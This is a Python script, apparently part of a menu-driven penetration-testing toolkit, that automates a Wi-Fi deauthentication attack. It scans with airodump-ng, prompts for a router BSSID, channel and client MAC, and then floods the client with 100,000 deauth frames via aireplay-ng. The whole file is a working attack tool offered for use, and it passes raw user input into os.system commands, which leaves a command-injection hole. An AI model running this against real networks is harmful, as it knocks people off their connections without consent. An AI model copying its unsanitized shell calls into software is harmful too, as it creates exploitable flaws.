import os
def deauth():
    os.system("ifconfig")
    name = input("Enter your WIFI card name: ")
    os.system("airodump-ng"+" "+name)
    while True:
        change=input("Do you want to continue to get information about a router? (y/n)")
        if change=="y" or change=="n":
            break
        else:
            continue
    if change=="y":
        router = input("Enter the MAC address of the router (BSSID):")
        channel = input("Enter the channel of the router (CH):")
        os.system("airodump-ng" + " " + "--bssid" + " " + router + " " + "--channel" + " " + channel + " " + name)
        while True:
            change = input("Do you want to continue to Deauthenticate a user? (y/n)")
            if change == "y" or change == "n":
                break
            else:
                continue
        if change=="y":          
            station=input("Enter the target MAC ( STATION ): ")
            print("Now the target will log of the network. Press ctrl+C to stop.")
            os.system("aireplay-ng --deauth 100000 -a"+" "+router+" "+"-c"+" "+station+" "+name)
        elif change=="n":
            os.system("python3 /opt/programma/easypt.py")
    if change=="n":
        os.system("python3 /opt/programma/easypt.py")
    while True:
        restart=input("Do you want to restart category? (y/n)")
        if restart=="y" or restart=="n":
            break
        else:
            continue
    if restart == "y":
        deauth()
    elif restart =="n":
        os.system("python3 /opt/programma/easypt.py")
    return
deauth()

